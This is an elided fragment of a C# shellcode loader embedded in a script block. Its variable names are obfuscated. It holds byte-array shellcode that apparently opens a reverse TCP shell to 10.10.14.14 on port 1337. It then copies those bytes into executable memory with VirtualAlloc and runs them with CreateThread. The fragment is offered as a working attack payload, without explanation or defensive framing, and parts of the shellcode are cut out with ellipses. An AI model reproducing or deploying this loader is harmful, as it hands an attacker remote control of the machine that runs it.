...
0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x50,0x01,0xd3,0x8b,0x48,0x18,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x0e,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr hDBAUgYHUqA = VirtualAlloc(IntPtr.Zero,(UIntPtr)uRTjhrR.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(uRTjhrR,0,hDBAUgYHUqA,uRTjhrR.Length);
        IntPtr xvmaJ = IntPtr.Zero;
        IntPtr ckelF7HB4gX = CreateThread(IntPtr.Zero,UIntPtr.Zero,hDBAUgYHUqA,IntPtr.Zero,0,ref xvmaJ);
    }
</script>
